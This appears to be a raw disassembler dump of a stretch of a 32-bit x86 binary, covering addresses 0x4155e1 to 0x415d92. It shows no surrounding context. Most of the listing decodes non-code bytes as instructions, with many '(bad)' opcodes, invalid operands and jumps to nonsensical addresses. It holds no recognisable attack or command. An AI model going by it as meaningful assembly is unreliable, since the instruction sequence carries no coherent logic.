  4155e1:	(bad)  
  4155e2:	fnsave [ecx-0x19b598ae]
  4155e8:	pop    edi
  4155e9:	fwait
  4155ea:	jp     0x415623
  4155ec:	lock push ds
  4155ee:	pop    ss
  4155ef:	in     eax,dx
  4155f0:	or     eax,0xd613b4f5
  4155f5:	mov    bh,0x6d
  4155f7:	out    0xe0,al
  4155f9:	sar    eax,cl
  4155fb:	mov    ecx,0x220d3ee5
  415600:	aas    
  415601:	cs jbe 0x415669
  415604:	test   esi,edi
  415606:	mov    ch,0x2d
  415608:	rol    DWORD PTR [edx+ecx*2],cl
  41560b:	or     BYTE PTR [ebx],dh
  41560d:	(bad)  
  41560e:	mov    dh,0x4
  415610:	shl    BYTE PTR [esi],1
  415612:	pop    ecx
  415613:	scas   eax,DWORD PTR es:[edi]
  415614:	inc    ecx
  415615:	rcl    DWORD PTR [ebx-0x42],cl
  415618:	xor    al,bl
  41561a:	dec    edx
  41561b:	pop    edi
  41561c:	xchg   ecx,eax
  41561d:	lock fmul DWORD PTR [eax+ecx*8+0x41728f6e]
  415625:	js     0x4155b1
  415627:	ins    DWORD PTR es:[edi],dx
  415628:	adc    eax,0xca000ecf
  41562d:	sbb    al,0x5e
  41562f:	inc    esp
  415630:	stc    
  415631:	and    ebp,0xc9307a43
  415637:	js     0x4155c1
  415639:	xor    al,0x7e
  41563b:	bound  ecx,QWORD PTR [edi+0x38db33cb]
  415641:	repnz adc esi,ebx
  415644:	jnp    0x415669
  415646:	out    0x6a,al
  415648:	ret    0xd18f
  41564b:	cwde   
  41564c:	push   eax
  41564d:	ror    edi,cl
  41564f:	scas   eax,DWORD PTR es:[edi]
  415650:	mov    cl,BYTE PTR ds:0x9258c2b9
  415656:	xor    DWORD PTR [ebx+0x107d0345],edi
  41565c:	out    0xc9,eax
  41565e:	or     ebp,DWORD PTR [ebp-0x3b]
  415661:	dec    edi
  415662:	in     al,dx
  415663:	dec    ecx
  415664:	mov    ah,0x36
  415666:	imul   edx,DWORD PTR [edx],0x2c9beefb
  41566c:	add    DWORD PTR [edi+0x69],edx
  41566f:	inc    BYTE PTR [edx+0x5e]
  415672:	addr16 push ecx
  415674:	jno    0x4156b3
  415676:	imul   ebx,DWORD PTR [ecx+edi*2+0x78c119e8],0x1b
  41567e:	fwait
  41567f:	in     al,0x2f
  415681:	pusha  
  415682:	mov    ebp,0xd07d9c9c
  415687:	aam    0x91
  415689:	test   cl,0xec
  41568c:	add    BYTE PTR [ebp-0x38],bh
  41568f:	pop    ecx
  415690:	scas   al,BYTE PTR es:[edi]
  415691:	iret   
  415692:	mov    esi,DWORD PTR [ecx-0x16ef3b2d]
  415698:	addr16 or eax,0xe1946677
  41569e:	push   ebx
  41569f:	mov    ?,ebx
  4156a1:	fbstp  TBYTE PTR [edi+eiz*2+0x52]
  4156a5:	sub    dh,ch
  4156a7:	test   eax,0x4a8469bd
  4156ac:	in     eax,dx
  4156ad:	mov    eax,0xf0f135cb
  4156b2:	sub    al,0x73
  4156b4:	mov    ch,0xe3
  4156b6:	ret    0x4e2c
  4156b9:	inc    ebp
  4156ba:	call   FWORD PTR [esi+0x2ac16b2f]
  4156c0:	add    bl,BYTE PTR [edx+ebp*4]
  4156c3:	cmc    
  4156c4:	inc    edx
  4156c5:	lea    ebp,[edx+0x15]
  4156c8:	cmp    ch,BYTE PTR ds:0x69a929a8
  4156ce:	fdivr  DWORD PTR [ebx-0x18]
  4156d1:	lahf   
  4156d2:	jne    0x415661
  4156d4:	pop    ss
  4156d5:	pop    ecx
  4156d6:	stc    
  4156d7:	cld    
  4156d8:	out    dx,eax
  4156d9:	shl    bl,0x5c
  4156dc:	add    al,bl
  4156de:	(bad)  
  4156df:	stos   DWORD PTR es:[di],eax
  4156e1:	mov    edi,0xa7031e4
  4156e6:	js     0x415691
  4156e8:	aaa    
  4156e9:	dec    eax
  4156ea:	in     eax,0x65
  4156ec:	and    BYTE PTR [ecx],0xee
  4156ef:	mov    al,0x99
  4156f1:	xchg   ebx,eax
  4156f2:	imul   ecx,DWORD PTR [eax],0x392701eb
  4156f8:	pop    ecx
  4156f9:	xor    ecx,DWORD PTR [edi+0x7e5aca04]
  4156ff:	icebp  
  415700:	fild   WORD PTR [ebx+ebx*8+0x49]
  415704:	(bad)  
  415706:	adc    al,0x3c
  415708:	add    eax,0xe258426d
  41570d:	sar    DWORD PTR [edi-0x52665ebd],cl
  415713:	inc    eax
  415714:	sbb    cl,BYTE PTR [edx+0x27]
  415717:	in     al,0x7c
  415719:	test   al,0xc6
  41571b:	dec    esi
  41571c:	aad    0x2b
  41571e:	ret    
  41571f:	in     eax,0x57
  415721:	rcr    BYTE PTR [edx],0xd0
  415724:	jns    0x41579f
  415726:	push   cs
  415727:	call   0xd12c43c1
  41572c:	pop    ebp
  41572d:	mov    ecx,0x5a06692f
  415732:	iret   
  415733:	std    
  415734:	or     DWORD PTR [edx+0x31],esi
  415737:	leave  
  415738:	aaa    
  415739:	enter  0x59ff,0x23
  41573d:	cwde   
  41573e:	and    BYTE PTR [edi+0x19],bl
  415741:	xchg   edx,eax
  415742:	inc    edx
  415743:	pop    esi
  415744:	fidivr WORD PTR [esi]
  415746:	popa   
  415747:	sub    BYTE PTR [eax+ebx*8],dl
  41574a:	loopne 0x41579d
  41574c:	jl     0x4156fd
  41574e:	addr16 (bad) 
  415750:	push   edx
  415751:	scas   al,BYTE PTR es:[edi]
  415752:	mul    BYTE PTR [eax-0x108f4281]
  415758:	xor    ch,ch
  41575a:	sbb    edi,esi
  41575c:	dec    esi
  41575d:	sbb    bh,ah
  41575f:	mov    edx,0x70a6688c
  415764:	outs   dx,BYTE PTR ds:[esi]
  415765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415766:	pop    edi
  415767:	shl    DWORD PTR ds:0xf01dffce,1
  41576d:	in     al,dx
  41576e:	cmp    al,0x95
  415770:	shl    BYTE PTR [edx+0x2f28317c],0x9e
  415777:	ds jbe 0x4157bd
  41577a:	mov    ds:0x68911f16,eax
  41577f:	pushf  
  415780:	mov    DWORD PTR [edi-0x3d],ecx
  415783:	sub    DWORD PTR [ebp+0x27],0xffffff88
  415787:	ss popf 
  415789:	jae    0x41579f
  41578b:	std    
  41578c:	adc    al,0xc2
  41578e:	frstor gs:[ebx+0x48c11aae]
  415795:	pop    esp
  415796:	loop   0x4157e1
  415798:	mov    WORD PTR ds:0x32729cbe,?
  41579e:	add    BYTE PTR [ebx],al
  4157a0:	(bad)  
  4157a1:	div    edi
  4157a3:	mov    edx,DWORD PTR [ebp-0x4]
  4157a6:	jmp    0x415a8a
  4157ab:	adc    al,0xcd
  4157ad:	inc    esi
  4157ae:	rol    BYTE PTR [ecx+0x51],cl
  4157b1:	xchg   esp,eax
  4157b2:	int    0x7b
  4157b4:	rcl    DWORD PTR [esi],1
  4157b6:	test   BYTE PTR [ebp-0x14],al
  4157b9:	inc    esi
  4157ba:	cld    
  4157bb:	jg     0x4157cc
  4157bd:	jg     0x41582f
  4157bf:	mov    ecx,0xc70707e
  4157c4:	mov    ah,0x2a
  4157c6:	xor    eax,0x28b5beee
  4157cb:	bound  edx,QWORD PTR [ebp+0x12]
  4157ce:	lds    ebx,FWORD PTR [eax]
  4157d0:	dec    edx
  4157d1:	mov    BYTE PTR [ebx-0x3c],cl
  4157d4:	sahf   
  4157d5:	in     al,0x78
  4157d7:	iret   
  4157d8:	dec    esp
  4157d9:	add    eax,0xcbf37ef4
  4157de:	mov    ?,ecx
  4157e0:	mov    dl,0x4a
  4157e2:	xor    eax,ecx
  4157e4:	mov    edi,DWORD PTR [ebx+0x22f5f3cd]
  4157ea:	test   al,0x27
  4157ec:	xor    bl,0x59
  4157ef:	aam    0x86
  4157f1:	shr    BYTE PTR gs:[edi+0x26a0a561],1
  4157f8:	dec    edx
  4157f9:	icebp  
  4157fa:	cmp    BYTE PTR [edx-0x63],dh
  4157fd:	shr    DWORD PTR [edx+0x1b94822f],cl
  415803:	aas    
  415804:	pop    ebx
  415805:	pop    esp
  415806:	sbb    eax,0x5c860d36
  41580b:	mov    ah,0xa
  41580d:	jne    0x415807
  41580f:	cli    
  415810:	imul   esi,DWORD PTR [ebp+0x14],0xffffff97
  415814:	jns    0x4157f0
  415816:	adc    BYTE PTR [ebp-0x30fa969b],bh
  41581c:	gs mov eax,0xde6f8871
  415822:	cwde   
  415823:	dec    edx
  415824:	fdivr  st(4),st
  415826:	inc    ecx
  415827:	ss out 0x4a,al
  41582a:	hlt    
  41582b:	inc    esi
  41582c:	sar    DWORD PTR [ecx-0x42],1
  41582f:	xchg   edx,eax
  415830:	mov    gs,eax
  415832:	mov    edx,0x3e04302f
  415837:	xchg   ecx,eax
  415838:	rcr    esi,0xb8
  41583b:	jl     0x4157e6
  41583d:	mov    ch,al
  41583f:	mov    al,ds:0x19b9da76
  415844:	dec    edi
  415845:	xor    BYTE PTR [ecx+0x2ad7e22a],al
  41584b:	mov    ch,0x85
  41584d:	outs   dx,DWORD PTR ds:[esi]
  41584e:	fcomip st,st(7)
  415850:	pushf  
  415851:	and    al,0x52
  415853:	jne    0x41584c
  415855:	inc    esp
  415856:	xor    edi,DWORD PTR [edx]
  415858:	and    esi,ebp
  41585a:	fidivr DWORD PTR [edx]
  41585c:	mov    BYTE PTR [ebp+eiz*2-0x4a61bb09],al
  415863:	jecxz  0x415872
  415865:	out    dx,eax
  415866:	mov    es,WORD PTR [ecx]
  415868:	imul   edi,DWORD PTR [ecx+esi*1],0xffffffeb
  41586c:	jl     0x415813
  41586e:	mov    gs,ecx
  415870:	js     0x4158d3
  415872:	fist   DWORD PTR [edi+edx*1+0x127d1103]
  415879:	test   BYTE PTR [edi-0x6104cd27],0x1d
  415880:	call   0xf00f14f0
  415885:	mov    dl,BYTE PTR [eax-0x6d]
  415888:	fiadd  WORD PTR [ebx-0x79]
  41588b:	clc    
  41588c:	lods   eax,DWORD PTR ds:[esi]
  41588d:	cwde   
  41588e:	mov    DWORD PTR [esi-0x6518eeb8],esp
  415894:	ret    0xcf7c
  415897:	push   edx
  415898:	xchg   esp,eax
  415899:	addr16 pop ebp
  41589b:	xchg   edi,eax
  41589c:	gs aam 0x3b
  41589f:	mov    BYTE PTR [edi],ch
  4158a1:	mov    edx,0x3d7e808c
  4158a6:	sar    BYTE PTR [ecx+0x30],cl
  4158a9:	call   0xb218:0x1e4ba0da
  4158b0:	div    DWORD PTR [ecx]
  4158b2:	in     al,dx
  4158b3:	(bad)  
  4158b4:	iret   
  4158b5:	or     eax,0x7f6d1239
  4158ba:	or     al,0x3b
  4158bc:	addr16 sub al,0x19
  4158bf:	jns    0x4158cd
  4158c1:	sub    DWORD PTR [eax+0x5f],0x78
  4158c5:	xor    dh,ah
  4158c7:	je     0x415875
  4158c9:	push   esp
  4158ca:	xchg   ecx,eax
  4158cb:	(bad)  [ecx-0x30]
  4158ce:	in     eax,dx
  4158cf:	mov    dl,0x2e
  4158d1:	lock xchg esi,eax
  4158d3:	imul   ebx,DWORD PTR [ecx-0x19],0x40
  4158d7:	test   BYTE PTR [ebp-0x6e],ch
  4158da:	pop    ebx
  4158db:	rcr    BYTE PTR ds:0x5658be5e,0x80
  4158e2:	sbb    ebp,DWORD PTR [eax]
  4158e4:	rol    BYTE PTR [esi+0x56],cl
  4158e7:	ret    0xc819
  4158ea:	sub    al,0xca
  4158ec:	sub    DWORD PTR [edi+0x65337aab],esi
  4158f2:	int3   
  4158f3:	sbb    dh,BYTE PTR [eax+ebp*4]
  4158f6:	ins    DWORD PTR es:[edi],dx
  4158f7:	xchg   esp,eax
  4158f8:	add    eax,0xb4c23c28
  4158fd:	mov    ebx,esp
  4158ff:	and    al,0x37
  415901:	sub    al,0xe9
  415903:	sti    
  415904:	cmp    ebx,DWORD PTR [eax+edi*2+0x20]
  415908:	jo     0x41594d
  41590a:	pop    ecx
  41590b:	lahf   
  41590c:	mov    ds:0x254e219a,al
  415911:	repz pop ds
  415913:	sbb    BYTE PTR [esp+ebx*4+0x85b4477],bl
  41591a:	mov    fs,WORD PTR [edi+eax*4]
  41591d:	outs   dx,DWORD PTR ds:[esi]
  41591e:	pop    edx
  41591f:	iret   
  415920:	sahf   
  415921:	push   cs
  415922:	in     al,dx
  415923:	jno    0x41592f
  415925:	mov    ch,0x15
  415927:	adc    al,0x36
  415929:	retf   
  41592a:	fsub   QWORD PTR [ebx]
  41592c:	popa   
  41592d:	add    edx,DWORD PTR [esi]
  41592f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415930:	xchg   edx,eax
  415931:	rcl    DWORD PTR [ebx],1
  415933:	adc    dh,BYTE PTR [esi-0xc84e647]
  415939:	pusha  
  41593a:	loopne 0x415908
  41593c:	mov    edx,0x473e0967
  415941:	pop    ebp
  415942:	cmp    al,0xf
  415944:	mov    DWORD PTR [esi],ebp
  415946:	jbe    0x41592d
  415948:	push   ds
  415949:	xchg   ebp,eax
  41594a:	call   FWORD PTR [ebx+0x20]
  41594d:	pushf  
  41594e:	inc    esi
  41594f:	xchg   edx,eax
  415950:	add    al,al
  415952:	retf   
  415953:	mov    DWORD PTR [edi-0x7d],esp
  415956:	sbb    eax,0x3bcbeeb6
  41595b:	aad    0x57
  41595d:	sbb    DWORD PTR [edx-0x6ffc3b39],esi
  415963:	sub    DWORD PTR [ecx-0x1275bf29],0x521e5005
  41596d:	push   ds
  41596e:	fstp   QWORD PTR [ecx+0x48f3e2bf]
  415974:	cld    
  415975:	mov    ebp,0xf2716df2
  41597a:	cmp    BYTE PTR ds:0x22775ef5,bl
  415980:	cmc    
  415981:	xor    BYTE PTR [ebx-0x1c],0x99
  415985:	dec    esp
  415986:	inc    eax
  415987:	int3   
  415988:	add    BYTE PTR [edx-0x7],ch
  41598b:	mov    ecx,0x6fd45d35
  415990:	adc    al,0x88
  415992:	fsubr  DWORD PTR [ecx+0x8]
  415995:	out    0x26,al
  415997:	hlt    
  415998:	xor    BYTE PTR [edx-0x4a45f9df],bl
  41599e:	xchg   ebx,eax
  41599f:	sti    
  4159a0:	cs pushf 
  4159a2:	or     al,0x3d
  4159a4:	ja     0x415999
  4159a6:	add    DWORD PTR [ecx+0x6ef3322c],0xffffff8d
  4159ad:	imul   edx,eax,0x5c
  4159b0:	cmp    bh,bh
  4159b2:	(bad)  
  4159b4:	mov    BYTE PTR [ebx],dh
  4159b6:	dec    edi
  4159b7:	xchg   ebx,eax
  4159b8:	aam    0xf1
  4159ba:	ds in  al,dx
  4159bc:	jae    0x415967
  4159be:	pop    ecx
  4159bf:	in     eax,0xda
  4159c1:	fistp  WORD PTR [esi-0xa]
  4159c4:	les    ebx,FWORD PTR [eax]
  4159c6:	jg     0x4159b0
  4159c8:	test   DWORD PTR ds:0x1af7b81b,edi
  4159ce:	dec    edi
  4159cf:	jmp    0x850e5d2d
  4159d4:	push   eax
  4159d5:	(bad)
  4159d9:	dec    ebp
  4159da:	mov    ch,0xa9
  4159dc:	pop    esi
  4159dd:	pop    esi
  4159de:	mul    BYTE PTR [edx-0x12]
  4159e1:	xor    al,BYTE PTR [edi+0x1bc3c123]
  4159e7:	sub    eax,0x16920561
  4159ec:	mov    WORD PTR [edx-0x7a10edd3],ss
  4159f2:	adc    BYTE PTR [ecx],dl
  4159f4:	add    DWORD PTR [esi],esi
  4159f6:	in     al,dx
  4159f7:	sub    edi,esi
  4159f9:	clc    
  4159fa:	mov    bh,0x94
  4159fc:	inc    cl
  4159fe:	sbb    al,BYTE PTR [ecx]
  415a00:	es cmp al,ch
  415a03:	sbb    BYTE PTR [ebx],bh
  415a05:	repnz sbb eax,eax
  415a08:	stos   DWORD PTR es:[edi],eax
  415a09:	imul   edi,DWORD PTR [edi-0x47],0x72d0297e
  415a10:	stos   DWORD PTR es:[edi],eax
  415a11:	jno    0x415a64
  415a13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a14:	mov    ah,0x4b
  415a16:	fdivr  QWORD PTR [edx]
  415a18:	push   es
  415a19:	mov    ds:0x8896fc5e,eax
  415a1e:	ins    BYTE PTR es:[edi],dx
  415a1f:	pop    es
  415a20:	(bad)  
  415a22:	sub    BYTE PTR [edx+0x112de2d8],dl
  415a28:	ret    0xc3e7
  415a2b:	fisttp DWORD PTR [ecx+0x2e]
  415a2e:	je     0x415a4d
  415a30:	aad    0x4
  415a32:	aad    0x2e
  415a34:	mov    ch,0x92
  415a36:	add    al,0x1
  415a38:	pop    ecx
  415a39:	mov    ah,0x46
  415a3b:	cwde   
  415a3c:	daa    
  415a3d:	mov    ds:0xdc860a84,al
  415a42:	jns    0x415a41
  415a44:	pop    edi
  415a45:	xchg   BYTE PTR [edx-0x22],al
  415a48:	in     al,dx
  415a49:	fdivr  DWORD PTR [edx]
  415a4b:	and    BYTE PTR [edx],al
  415a4d:	test   al,0xc1
  415a4f:	push   ecx
  415a50:	mov    esp,DWORD PTR [ebp-0x4cced6dc]
  415a56:	xor    BYTE PTR [eax+0x605271fc],0x1f
  415a5d:	mov    al,0xb4
  415a5f:	mov    dh,0x6
  415a61:	sub    edx,DWORD PTR ds:0xf854f6a8
  415a67:	in     al,dx
  415a68:	outs   dx,BYTE PTR ds:[esi]
  415a69:	popf   
  415a6a:	dec    edi
  415a6b:	xchg   WORD PTR [esi],si
  415a6e:	or     esp,ebp
  415a70:	sbb    BYTE PTR [edx],0xf2
  415a73:	cmp    al,0xda
  415a75:	cmp    DWORD PTR [ecx+0x63ea34bd],0x82c51009
  415a7f:	jbe    0x415a65
  415a81:	fs int3 
  415a83:	rol    BYTE PTR [edx+0x5f98bce2],cl
  415a89:	shl    BYTE PTR [ebx],0xd1
  415a8c:	lea    eax,[edx+eax*1+0x32729c]
  415a93:	jmp    0x415d77
  415a98:	sub    dl,BYTE PTR [eax-0x24]
  415a9b:	mov    esp,0x6eaabc6a
  415aa0:	popa   
  415aa1:	pop    ecx
  415aa2:	xchg   ebp,eax
  415aa3:	aas    
  415aa4:	cmc    
  415aa5:	call   0xdfa34b1
  415aaa:	jg     0x415b1c
  415aac:	mov    ecx,0x3170707e
  415ab1:	out    dx,eax
  415ab2:	sti    
  415ab3:	and    eax,DWORD PTR [ebx]
  415ab5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ab6:	mov    ecx,0xc60d7714
  415abb:	cs inc eax
  415abd:	pop    ds
  415abe:	dec    ebx
  415abf:	pop    ebp
  415ac0:	ins    BYTE PTR es:[edi],dx
  415ac1:	sahf   
  415ac2:	mov    ah,0xdb
  415ac4:	(bad)  
  415ac5:	(bad)
  415ac8:	int    0x3f
  415aca:	pop    es
  415acb:	adc    ah,BYTE PTR [eax+0x78]
  415ace:	shl    BYTE PTR [edi-0x6512b7f3],1
  415ad4:	mov    ebx,0xcf8cac5
  415ad9:	ret    0x91d2
  415adc:	enter  0x10e,0x6a
  415ae0:	retf   
  415ae1:	int    0xbc
  415ae3:	pop    edi
  415ae4:	test   eax,0x6f21692e
  415ae9:	retf   0x2242
  415aec:	dec    ebp
  415aed:	mov    bl,0xff
  415aef:	arpl   WORD PTR ds:0x63586241,dx
  415af5:	test   ebp,esi
  415af7:	in     al,0x90
  415af9:	inc    ecx
  415afa:	adc    BYTE PTR [ebp-0x4f630b4e],0xb3
  415b01:	je     0x415b0a
  415b03:	sbb    edi,DWORD PTR [edi]
  415b05:	xchg   edx,eax
  415b06:	js     0x415b30
  415b08:	cmp    eax,0x212fd501
  415b0d:	inc    ecx
  415b0e:	mov    edx,DWORD PTR [esi]
  415b10:	jmp    0xa16e9b7c
  415b15:	and    ebp,0x18f2f1ea
  415b1b:	mov    DWORD PTR [edi+0x5b],eax
  415b1e:	in     al,dx
  415b1f:	cs retf 
  415b21:	jnp    0x415abc
  415b23:	jecxz  0x415b44
  415b25:	das    
  415b26:	leave  
  415b27:	popa   
  415b28:	cmp    eax,DWORD PTR [eax+0x4bc7626e]
  415b2e:	pop    ebp
  415b2f:	(bad)  
  415b30:	push   esp
  415b31:	fstp   QWORD PTR [edx-0x4e]
  415b34:	les    ebp,FWORD PTR [esi-0x4f]
  415b37:	inc    eax
  415b38:	out    dx,eax
  415b39:	mov    ss,WORD PTR [esi-0x29ebb69c]
  415b3f:	cmp    eax,0x8d429efc
  415b44:	retf   0x1350
  415b47:	int3   
  415b48:	mov    edi,0x57cbfe30
  415b4d:	inc    esp
  415b4e:	jns    0x415b0a
  415b50:	mov    bl,0x9
  415b52:	int3   
  415b53:	pop    ds
  415b54:	or     dl,dh
  415b56:	retf   0x664d
  415b59:	test   al,0x53
  415b5b:	xchg   esi,eax
  415b5c:	je     0x415bcb
  415b5e:	pop    edi
  415b5f:	(bad)  
  415b60:	fcomp  QWORD PTR [edi]
  415b62:	xchg   edi,eax
  415b63:	retf   
  415b64:	ins    DWORD PTR es:[edi],dx
  415b65:	and    al,0xc8
  415b67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b68:	rcl    DWORD PTR [ebx-0x7b937d54],0x89
  415b6f:	jecxz  0x415b88
  415b71:	faddp  st(5),st
  415b73:	sub    DWORD PTR [edi+ecx*2-0x7b5582cd],0xffffff9d
  415b7b:	pop    ebx
  415b7c:	sbb    eax,0x8ebf738b
  415b81:	hlt    
  415b82:	xchg   esi,eax
  415b83:	jb     0x415bd6
  415b85:	add    bh,bl
  415b87:	stos   BYTE PTR es:[edi],al
  415b88:	and    eax,0x6b63bde0
  415b8d:	jp     0x415b7c
  415b8f:	or     al,0x8d
  415b91:	cmp    DWORD PTR [eax+0x47778d55],edx
  415b97:	popf   
  415b98:	ficomp WORD PTR [edi+edi*8+0x3c]
  415b9c:	push   ecx
  415b9d:	aas    
  415b9e:	repnz add DWORD PTR [edi+0x51],ebx
  415ba2:	scas   al,BYTE PTR es:[edi]
  415ba3:	inc    esi
  415ba4:	jno    0x415c09
  415ba6:	or     dh,ch
  415ba8:	cld    
  415ba9:	daa    
  415baa:	fwait
  415bab:	test   BYTE PTR [ecx+ebp*8+0x71],dl
  415baf:	fcomp  st(2)
  415bb1:	jp     0x415b7e
  415bb3:	je     0x415bc9
  415bb5:	fcomp  QWORD PTR [edx+0x17e4aacd]
  415bbb:	in     eax,0x57
  415bbd:	cmp    cl,BYTE PTR [esi]
  415bbf:	add    BYTE PTR [ebx+eax*8+0x31aaa823],ah
  415bc6:	pop    ds
  415bc7:	ds sbb al,0xf9
  415bca:	mov    bh,0x64
  415bcc:	outs   dx,BYTE PTR ds:[esi]
  415bcd:	sub    ebx,DWORD PTR gs:[edi]
  415bd0:	pop    esp
  415bd1:	aad    0xa4
  415bd3:	ds cmp eax,0xb7162177
  415bd9:	add    dl,BYTE PTR [eax-0x63]
  415bdc:	inc    ebp
  415bdd:	ror    BYTE PTR [ebp-0x57aa89da],0x61
  415be4:	adc    BYTE PTR [ecx+0x17a288da],cl
  415bea:	js     0x415b92
  415bec:	outs   dx,DWORD PTR ds:[esi]
  415bed:	inc    edx
  415bee:	sub    DWORD PTR [ecx-0x25],ebp
  415bf1:	aaa    
  415bf2:	das    
  415bf3:	scas   eax,DWORD PTR es:[edi]
  415bf4:	xchg   esp,eax
  415bf5:	inc    esp
  415bf6:	arpl   WORD PTR [ecx+0x20],sp
  415bf9:	and    dh,0xa7
  415bfc:	mov    ss:0x792067d3,eax
  415c02:	pop    ds
  415c03:	add    edi,DWORD PTR [ebp+0x22]
  415c06:	(bad)  
  415c07:	mov    edx,0x28e6335c
  415c0c:	or     al,0x99
  415c0e:	and    edi,DWORD PTR [edi+0x13d7bf08]
  415c14:	(bad)  
  415c15:	out    0xf9,al
  415c17:	mov    dh,0x3d
  415c19:	cli    
  415c1a:	cmp    edi,DWORD PTR [ebx-0x10781d75]
  415c20:	jns    0x415be5
  415c22:	mov    edx,0x32fcc64c
  415c27:	lds    edx,FWORD PTR [ebx-0x17]
  415c2a:	bound  ebp,QWORD PTR [edi+0x39716cea]
  415c30:	cwde   
  415c31:	and    BYTE PTR ds:0x14b4fcd4,0x10
  415c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c39:	ret    
  415c3a:	iret   
  415c3b:	jns    0x415bf8
  415c3d:	call   0x56ac4d33
  415c42:	pop    ebx
  415c43:	in     al,0x4a
  415c45:	shl    DWORD PTR [ebx],0x80
  415c48:	dec    DWORD PTR [ebp+ecx*8+0x76ed52fd]
  415c4f:	dec    edx
  415c50:	cmp    ah,dl
  415c52:	ret    
  415c53:	aas    
  415c54:	in     eax,dx
  415c55:	push   ebx
  415c56:	xor    bl,BYTE PTR [edx]
  415c58:	fisttp QWORD PTR [edx+0x3fa37ee2]
  415c5e:	adc    dl,bl
  415c60:	and    dh,BYTE PTR [edi+0x34]
  415c63:	jge    0x415bf7
  415c65:	pop    eax
  415c66:	test   DWORD PTR [ebx+0x1],esp
  415c69:	repnz std 
  415c6b:	mov    eax,ds:0x5801c542
  415c70:	in     al,dx
  415c71:	mov    ?,WORD PTR [eax+eiz*4-0x70]
  415c75:	into   
  415c76:	sub    edi,esp
  415c78:	dec    ecx
  415c79:	add    al,0x8c
  415c7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c7c:	loope  0x415cb0
  415c7e:	pop    eax
  415c7f:	sub    esp,esp
  415c81:	jp     0x415c69
  415c83:	mov    WORD PTR [eax-0x183c866b],ds
  415c89:	ds mov ebx,0x292a5e9c
  415c8f:	sub    BYTE PTR ds:0xae9eef0e,bl
  415c95:	xchg   esi,eax
  415c96:	and    eax,0x303924e1
  415c9b:	mov    eax,0x496e8c53
  415ca0:	add    BYTE PTR [esi-0x52],al
  415ca3:	cld    
  415ca4:	inc    esi
  415ca5:	in     al,dx
  415ca6:	mov    dh,0xfc
  415ca8:	div    DWORD PTR [eax]
  415caa:	test   dl,0x2e
  415cad:	sub    eax,DWORD PTR [ecx+0x9]
  415cb0:	rep ins DWORD PTR es:[edi],dx
  415cb2:	inc    ebx
  415cb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cb4:	jmp    0x19eb:0xfd15c05a
  415cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cbc:	dec    ebp
  415cbd:	clc    
  415cbe:	dec    esi
  415cbf:	repnz mov dl,BYTE PTR [edx+esi*1]
  415cc3:	jne    0x415c5f
  415cc5:	xchg   esi,eax
  415cc6:	mov    dh,0x1
  415cc8:	stos   BYTE PTR es:[edi],al
  415cc9:	scas   al,BYTE PTR es:[edi]
  415cca:	mov    bl,0x1e
  415ccc:	pop    es
  415ccd:	ror    DWORD PTR [edi],cl
  415ccf:	in     eax,0xc1
  415cd1:	sbb    al,0x38
  415cd3:	or     bl,BYTE PTR [esi-0x2b57266b]
  415cd9:	or     ch,BYTE PTR [eax+0x108310ea]
  415cdf:	hlt    
  415ce0:	mov    bl,0x6b
  415ce2:	cmp    eax,0x50eabf98
  415ce7:	xor    DWORD PTR [ebp+0x538abe00],ebp
  415ced:	lods   eax,DWORD PTR ds:[esi]
  415cee:	daa    
  415cef:	repnz popf 
  415cf1:	(bad)  
  415cf2:	jge    0x415d2f
  415cf4:	out    0x63,eax
  415cf6:	or     eax,0x9bccafcd
  415cfb:	xor    ah,BYTE PTR [eax+0x2d]
  415cfe:	mov    dl,ch
  415d00:	dec    ebx
  415d01:	std    
  415d02:	dec    ebp
  415d03:	mov    bl,ah
  415d05:	or     DWORD PTR [ebp-0x47],edi
  415d08:	or     dh,BYTE PTR [edi+0x41b2e848]
  415d0e:	(bad)  
  415d0f:	ror    DWORD PTR [ecx+0x57a7f70d],cl
  415d15:	in     al,0x36
  415d17:	lods   al,BYTE PTR ds:[esi]
  415d18:	outs   dx,DWORD PTR ds:[esi]
  415d19:	adc    al,0xb6
  415d1b:	sub    al,0x1e
  415d1d:	pop    edx
  415d1e:	add    DWORD PTR [esi+eiz*8],0xc
  415d22:	dec    esi
  415d23:	or     ebp,eax
  415d25:	lock xchg ecx,eax
  415d27:	push   edi
  415d28:	outs   dx,BYTE PTR ds:[esi]
  415d29:	test   BYTE PTR [edi-0x4d8617b8],ch
  415d2f:	inc    edx
  415d30:	scas   al,BYTE PTR es:[edi]
  415d31:	fnstsw WORD PTR [esi+ecx*1-0x6465aa19]
  415d38:	add    dl,ah
  415d3a:	jmp    DWORD PTR [eax-0x3a]
  415d3d:	les    esp,FWORD PTR ds:[ebx]
  415d40:	stos   DWORD PTR es:[edi],eax
  415d41:	pushf  
  415d42:	jns    0x415d48
  415d44:	sub    BYTE PTR [ecx-0x49028e1],dh
  415d4a:	dec    esi
  415d4b:	inc    edi
  415d4c:	mov    ebp,DWORD PTR [ecx-0x7d]
  415d4f:	adc    DWORD PTR [ecx],edi
  415d51:	sub    BYTE PTR [ecx-0x1fa262f7],bl
  415d57:	pushf  
  415d58:	clc    
  415d59:	xchg   ebx,eax
  415d5a:	push   es
  415d5b:	ins    DWORD PTR es:[edi],dx
  415d5c:	mov    dh,ah
  415d5e:	mov    DWORD PTR [edi-0x205336cd],edx
  415d64:	sar    DWORD PTR [edx],1
  415d66:	int3   
  415d67:	push   es
  415d68:	clc    
  415d69:	inc    ecx
  415d6a:	or     al,ch
  415d6c:	inc    esi
  415d6d:	aad    0x4d
  415d6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d70:	in     al,dx
  415d71:	push   ds
  415d72:	mov    edx,DWORD PTR [eax-0x74e64940]
  415d78:	push   ebp
  415d79:	or     BYTE PTR [ebx+0x489dc7d],cl
  415d7f:	xchg   edi,eax
  415d80:	mov    eax,DWORD PTR [ebp-0x18]
  415d83:	jmp    0x416067
  415d88:	dec    eax
  415d89:	fistp  QWORD PTR [edx+0x75a9712b]
  415d8f:	arpl   bx,ax
  415d91:	pop    ss
  415d92:	jp     0x415d95
